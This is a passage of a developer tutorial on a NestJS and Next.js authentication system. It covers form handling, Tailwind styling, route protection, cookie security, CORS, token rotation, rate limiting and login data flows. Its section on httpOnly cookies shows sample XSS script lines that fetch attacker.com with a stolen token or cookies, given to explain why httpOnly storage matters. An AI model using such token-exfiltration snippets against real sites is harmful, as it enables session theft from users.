      setError(err.message || 'Login failed');  // Show error
    } finally {
      setLoading(false);  // Hide loading state
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      {error && <div className="error">{error}</div>}

      <input
        type="email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
        disabled={loading}  // Disable during submit
        required
      />

      <input
        type="password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
        disabled={loading}
        required
      />

      <button type="submit" disabled={loading}>
        {loading ? 'Signing in...' : 'Sign In'}
      </button>
    </form>
  );
}
```

**Best Practices:**

1. **Controlled Inputs**:
   ```typescript
   // Value is controlled by React state
   <input value={email} onChange={(e) => setEmail(e.target.value)} />
   ```

2. **Loading States**:
   ```typescript
   const [loading, setLoading] = useState(false);
   // Disable form while submitting
   <button disabled={loading}>Submit</button>
   ```

3. **Error Display**:
   ```typescript
   const [error, setError] = useState('');
   // Show errors to user
   {error && <div className="error">{error}</div>}
   ```

4. **Form Validation**:
   ```typescript
   // Browser validation
   <input type="email" required minLength={8} />

   // Custom validation
   const validatePassword = (password: string) => {
     if (password.length < 8) {
       setError('Password must be at least 8 characters');
       return false;
     }
     return true;
   };
   ```

---

### 6. Styling with Tailwind CSS

All components use Tailwind utility classes matching your design system.

```typescript
// Your design tokens in tailwind.config.js
colors: {
  brandGreen: "#3b7a48",
  brandBg: "#f7fcf8",
  brandBorder: "#d9eadf",
  brandSurface: "#eefaf2",
  brandText: {
    DEFAULT: "#2f3a2f",
    soft: "#4a5a4a",
  },
}

// Using in components
<div className="
  rounded-2xl              // Large border radius
  border border-brandBorder // Soft green border
  bg-white/80              // White with 80% opacity
  p-8                      // Padding: 2rem (32px)
  shadow-sm                // Subtle shadow
">
  <h1 className="
    text-2xl               // Font size: 1.5rem (24px)
    font-semibold          // Font weight: 600
    text-brandText         // Your brand text color
  ">
    Title
  </h1>

  <button className="
    rounded-xl                    // Medium border radius
    bg-brandGreen                 // Your brand green
    px-4 py-2.5                   // Padding horizontal & vertical
    text-sm font-semibold         // Typography
    text-white                    // White text
    transition                    // Smooth transitions
    hover:bg-brandGreen/90        // Darker on hover
    disabled:opacity-50           // Faded when disabled
    disabled:cursor-not-allowed   // Show it's disabled
  ">
    Submit
  </button>
</div>
```

**Responsive Design:**
```typescript
<div className="
  flex flex-col gap-2    // Mobile: Stack vertically
  lg:flex-row lg:gap-4   // Desktop (1024px+): Horizontal row
">
  <div className="
    w-full                 // Mobile: Full width
    md:w-1/2               // Tablet (768px+): Half width
    lg:w-1/3               // Desktop (1024px+): Third width
  ">
    Card
  </div>
</div>
```

---

### 7. Route Protection (Client-Side)

```typescript
'use client';

import { useAuth } from '@/contexts/AuthContext';
import { useRouter } from 'next/navigation';
import { useEffect } from 'react';

export default function ProtectedPage() {
  const { user, loading } = useAuth();
  const router = useRouter();

  // Redirect if not authenticated
  useEffect(() => {
    if (!loading && !user) {
      router.push('/auth/login');
    }
  }, [user, loading, router]);

  // Show loading while checking auth
  if (loading) {
    return <div>Loading...</div>;
  }

  // Don't render anything if not authenticated
  if (!user) {
    return null;
  }

  // User is authenticated, show content
  return (
    <div>
      <h1>Protected Content</h1>
      <p>Welcome, {user.displayName}!</p>
    </div>
  );
}
```

**Role-Based Content:**
```typescript
'use client';

import { useAuth } from '@/contexts/AuthContext';

export default function Dashboard() {
  const { user } = useAuth();

  const isAdmin = user?.roles.includes('admin');
  const isPremium = user?.roles.includes('premium');

  return (
    <div>
      <h1>Dashboard</h1>

      {/* Everyone sees this */}
      <section>
        <h2>Basic Content</h2>
      </section>

      {/* Only premium users */}
      {isPremium && (
        <section>
          <h2>Premium Content</h2>
          <p>Exclusive features for premium members</p>
        </section>
      )}

      {/* Only admins */}
      {isAdmin && (
        <section>
          <h2>Admin Panel</h2>
          <a href="/admin">Manage Users</a>
        </section>
      )}
    </div>
  );
}
```

---

## Security Concepts Explained

### 1. HttpOnly Cookies

```typescript
// Backend sets cookie
res.cookie('access_token', token, {
  httpOnly: true,      // ← Cannot be accessed by JavaScript
  secure: true,        // ← Only sent over HTTPS
  sameSite: 'strict',  // ← Only sent to same domain
  maxAge: 900000,      // ← Expires in 15 minutes
  path: '/',           // ← Available on all paths
});
```

**Why HttpOnly?**

```typescript
// ❌ Without HttpOnly (stored in localStorage)
localStorage.setItem('token', token);
// Vulnerable to XSS:
<script>
  fetch('https://attacker.com?token=' + localStorage.getItem('token'));
</script>

// ✅ With HttpOnly (stored in cookie)
// JavaScript CANNOT access it
document.cookie  // Won't show httpOnly cookies
// XSS attack fails:
<script>
  fetch('https://attacker.com?token=' + document.cookie);  // No token!
</script>
```

**Cookie Flow:**
```
1. User logs in
   ↓
2. Server sets httpOnly cookie
   Set-Cookie: access_token=abc123; HttpOnly; Secure; SameSite=Strict
   ↓
3. Browser stores cookie (inaccessible to JavaScript)
   ↓
4. Browser automatically sends cookie with every request
   GET /api/user
   Cookie: access_token=abc123
   ↓
5. Server reads cookie and authenticates user
```

### 2. CORS (Cross-Origin Resource Sharing)

```typescript
// Backend configures CORS
app.enableCors({
  origin: ['http://localhost:3000'],  // ← Only allow this frontend
  credentials: true,                   // ← Allow cookies
  methods: 'GET,POST,PUT,DELETE',      // ← Allowed methods
  allowedHeaders: 'Content-Type, Authorization',
});
```

**Why CORS?**

```
Browser Security:
┌─────────────────────────────────────────────┐
│ http://localhost:3000 (Frontend)            │
│                                             │
│ fetch('http://localhost:3001/api/user')    │
└─────────────────────────────────────────────┘
         │
         │ ← Browser checks: Is 3001 allowed to receive
         │    requests from 3000?
         ▼
┌─────────────────────────────────────────────┐
│ http://localhost:3001 (Backend)             │
│                                             │
│ Access-Control-Allow-Origin: localhost:3000│ ✅
└─────────────────────────────────────────────┘

Without CORS:
❌ Browser blocks request
   "CORS policy: No 'Access-Control-Allow-Origin' header"

With CORS:
✅ Browser allows request
   Backend explicitly allows localhost:3000
```

### 3. Token Rotation

```typescript
// Old approach (Token Reuse)
// ❌ Same refresh token used forever
// If stolen once → stolen forever

// New approach (Token Rotation)
// ✅ New refresh token on each use
async refreshTokens(refreshToken: string) {
  // 1. Verify old token
  const storedToken = await this.prisma.refreshToken.findUnique({
    where: { token: refreshToken },
  });

  if (!storedToken) {
    throw new UnauthorizedException('Invalid refresh token');
  }

  // 2. DELETE old token
  await this.prisma.refreshToken.delete({
    where: { id: storedToken.id },
  });

  // 3. Generate NEW tokens
  const newAccessToken = /* ... */;
  const newRefreshToken = /* ... */;

  // 4. Store NEW refresh token
  await this.prisma.refreshToken.create({
    data: { token: newRefreshToken, /* ... */ },
  });

  return { accessToken: newAccessToken, refreshToken: newRefreshToken };
}
```

**Why Rotation?**
- If token is stolen, it only works once
- Next legitimate refresh invalidates stolen token
- Can detect and alert on reuse attempts

### 4. Rate Limiting

```typescript
// Prevent brute force attacks
ThrottlerModule.forRoot([
  {
    name: 'short',
    ttl: 1000,      // 1 second window
    limit: 3,       // Max 3 requests
  },
  {
    name: 'long',
    ttl: 60000,     // 1 minute window
    limit: 100,     // Max 100 requests
  },
]);
```

**Why Rate Limiting?**

```
Without rate limiting:
Attacker tries 1000 passwords per second
❌ Account cracked in minutes

With rate limiting:
Attacker tries 3 passwords per second
✅ Account takes years to crack
✅ Suspicious activity detected
```

### 5. CSRF Protection (Commented Out - Not Needed with SameSite)

```typescript
// Modern approach: SameSite cookies
res.cookie('token', token, {
  sameSite: 'strict',  // ← Prevents CSRF automatically
});

// This prevents:
// 1. User visits attacker.com
// 2. Attacker.com tries: fetch('yoursite.com/api/delete-account')
// 3. Cookie NOT sent because it's cross-site
// 4. Request fails ✅
```

---

## Data Flow Examples

### Complete Login Flow

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. User enters credentials in frontend form                     │
│    email: "user@example.com"                                    │
│    password: "MyPassword123!"                                   │
└────────────────────┬────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────────┐
│ 2. Frontend: handleSubmit()                                     │
│    - Calls: login({ email, password })                          │
└────────────────────┬────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────────┐
│ 3. API Client: lib/api/auth.ts                                  │
│    POST http://localhost:3001/auth/login                        │
│    Headers: { Content-Type: application/json }                  │
│    Body: { email, password }                                    │
│    credentials: 'include'  ← Important for cookies              │
└────────────────────┬────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────────┐
│ 4. NestJS: AuthController.login()                               │
│    - Receives HTTP request                                      │
│    - Extracts body, headers, IP                                 │
│    - Validates DTO (LoginDto)                                   │
└────────────────────┬────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────────┐
│ 5. AuthService.login()                                          │
│    a) Query database for user by email                          │
│       const user = await prisma.user.findUnique(...)            │
│                                                                  │
│    b) Verify password with Argon2                               │
│       const valid = await argon2.verify(hash, password)         │
│       ❌ Invalid? → throw UnauthorizedException                  │
│                                                                  │
│    c) Check email verification                                  │
│       ❌ Not verified? → throw UnauthorizedException             │
│                                                                  │
│    d) Check account status                                      │
│       ❌ Inactive? → throw UnauthorizedException                 │
│                                                                  │
│    e) Generate JWT access token                                 │
│       - Payload: { sub: userId, email, roles }                  │
│       - Expires: 15 minutes                                     │
│                                                                  │
│    f) Generate refresh token                                    │
│       - Random 64-byte token                                    │
│       - Store in database with userId, expiry, userAgent, IP    │
│       - Expires: 7 days                                         │
└────────────────────┬────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────────┐
│ 6. AuthController sets cookies                                  │
│    res.cookie('access_token', accessToken, {                    │
│      httpOnly: true,                                            │
│      secure: true,                                              │
│      sameSite: 'strict',                                        │
│      maxAge: 15 * 60 * 1000                                     │
│    })                                                           │
│    res.cookie('refresh_token', refreshToken, {                  │
│      httpOnly: true,                                            │
│      secure: true,                                              │
│      sameSite: 'strict',                                        │
│      maxAge: 7 * 24 * 60 * 60 * 1000                            │
│    })                                                           │
└────────────────────┬────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────────┐
│ 7. Response sent to frontend                                    │
│    Status: 200 OK                                               │
│    Set-Cookie: access_token=...; HttpOnly; Secure               │
│    Set-Cookie: refresh_token=...; HttpOnly; Secure              │
│    Body: {                                                      │
│      user: { id, email, displayName, roles },                   │
│      tokens: { accessToken, refreshToken }                      │
│    }                                                            │
└────────────────────┬────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────────┐
│ 8. Frontend: AuthContext updates state                          │
│    setUser(response.user)                                       │
│    - user is now available via useAuth()                        │
│    - Navigation shows UserMenu instead of login buttons         │
└────────────────────┬────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────────┐
│ 9. Redirect to dashboard                                        │
│    router.push('/member/dashboard')                             │
└─────────────────────────────────────────────────────────────────┘
```

### Protected API Request Flow

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. User clicks "View Profile"                                   │
└────────────────────┬────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────────┐
│ 2. Frontend makes request                                       │
│    GET http://localhost:3001/auth/me                            │
│    credentials: 'include'  ← Sends cookies automatically        │
└────────────────────┬────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────────┐
│ 3. Request reaches NestJS                                       │
│    Headers include: Cookie: access_token=eyJhbG...              │
└────────────────────┬────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────────┐
│ 4. JwtAuthGuard activates (global guard)                        │
│    a) Check if route is @Public()                               │
│       ❌ Not public → Continue to authentication                 │
│                                                                  │
│    b) JwtAccessStrategy extracts token                          │
│       - Tries cookie: request.cookies['access_token']           │
│       - Fallback: Authorization: Bearer <token>                 │
│                                                                  │
│    c) Verify JWT signature with JWT_ACCESS_SECRET               │
│       ❌ Invalid signature? → 401 Unauthorized                   │
│       ❌ Expired? → 401 Unauthorized                             │
│       ✅ Valid? → Decode payload                                 │
│                                                                  │
│    d) Call validate() method                                    │
│       - Payload: { sub: userId, email, roles }                  │
│       - Query database to ensure user still exists              │
│       - Check if user.isActive                                  │
│       ❌ User not found/inactive? → 401 Unauthorized             │
│       ✅ User valid? → Attach to request.user                    │
└────────────────────┬────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────────┐
│ 5. RolesGuard activates (if @Roles() decorator present)         │
│    a) Read @Roles('admin') decorator                            │
│    b) Compare with request.user.roles                           │
│    ❌ User doesn't have role? → 403 Forbidden                    │
│    ✅ User has role? → Allow request                             │
└────────────────────┬────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────────┐
│ 6. Controller method executes                                   │
│    @Get('me')                                                   │
│    async getCurrentUser(@CurrentUser() user: any) {             │
│      // user is already authenticated and authorized            │
│      return this.authService.getUserById(user.id);              │
│    }                                                            │
└────────────────────┬────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────────┐
│ 7. Response sent                                                │
│    Status: 200 OK                                               │
│    Body: { id, email, displayName, roles, ... }                 │
└────────────────────┬────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────────┐
│ 8. Frontend receives data                                       │
│    Display user profile                                         │
└─────────────────────────────────────────────────────────────────┘
```

---

## Best Practices & Design Patterns

### 1. Separation of Concerns

```
Controller (HTTP Layer)
└─ Handles HTTP requests/responses
   └─ Calls Service

Service (Business Logic)
└─ Contains core logic
   └─ Calls Repository/ORM

Repository/ORM (Data Layer)
└─ Database access
```

**Why?**
- Easy to test each layer independently
- Can swap implementations (e.g., change database)
- Clear responsibilities

### 2. Dependency Injection

```typescript
// ❌ Bad: Hard to test, tightly coupled
class AuthService {
  private prisma = new PrismaService();
  private jwt = new JwtService();

  async login() {
    // Can't mock PrismaService in tests
  }
}

// ✅ Good: Easy to test, loosely coupled
class AuthService {
  constructor(
    private prisma: PrismaService,  // Injected
    private jwt: JwtService,         // Injected
  ) {}

  async login() {
    // Can inject mocks in tests
  }
}
```

### 3. DTO Validation

```typescript
// ❌ Bad: Manual validation
async register(body: any) {
  if (!body.email || !isEmail(body.email)) {
    throw new Error('Invalid email');
  }
  if (!body.password || body.password.length < 8) {
    throw new Error('Password too short');
  }
  // ... more validation
}

// ✅ Good: Declarative validation
class RegisterDto {
  @IsEmail()
  email!: string;

  @MinLength(8)
  password!: string;
}

async register(@Body(ValidationPipe) dto: RegisterDto) {
  // dto is already validated ✅
}
```

### 4. Error Handling

```typescript
// ❌ Bad: Generic errors
throw new Error('Something went wrong');

// ✅ Good: Specific HTTP exceptions
throw new UnauthorizedException('Invalid credentials');
throw new NotFoundException('User not found');
throw new ConflictException('Email already exists');
throw new BadRequestException('Invalid data');
```

### 5. Async/Await

```typescript
// ❌ Bad: Callback hell
prisma.user.findUnique({ email }, (user) => {
  crypto.verifyPassword(password, user.password, (valid) => {
    if (valid) {
      jwt.sign(payload, (token) => {
        // ...
      });
    }
  });
});

// ✅ Good: Clean async/await
const user = await prisma.user.findUnique({ email });
const valid = await crypto.verifyPassword(password, user.password);
if (valid) {
  const token = await jwt.sign(payload);
}
```

### 6. Type Safety

```typescript
// ❌ Bad: Loosely typed
function login(data: any): any {
  return apiCall(data);
}

// ✅ Good: Strongly typed
interface LoginData {
  email: string;
  password: string;
}

interface AuthResponse {
  user: User;
  tokens: { accessToken: string; refreshToken: string };
}

function login(data: LoginData): Promise<AuthResponse> {
  return apiCall(data);
}
```

---

## Conclusion

This authentication system demonstrates:

1. **Backend Mastery (NestJS)**:
   - Module organization & dependency injection
   - Controllers, services, and guards
   - Passport strategies for authentication
   - Prisma ORM for type-safe database access
   - JWT tokens & refresh token rotation
   - Security best practices (Argon2, httpOnly cookies, CORS)

2. **Frontend Mastery (Next.js)**:
   - App Router with server & client components
   - React Context for global state
   - Fetch API for backend communication
   - Form handling with loading/error states
   - Route protection & role-based rendering
   - Tailwind CSS for consistent styling

3. **Security Principles**:
   - Defense in depth (multiple layers)
   - Least privilege (minimal permissions)
   - Fail securely (default to deny)
   - Don't trust client (server validation)
   - Cryptographic best practices

4. **Software Engineering**:
   - Separation of concerns
   - DRY (Don't Repeat Yourself)
   - SOLID principles
   - Type safety
   - Error handling
   - Testability

---

Keep this document as a reference while building similar systems or studying the codebase!
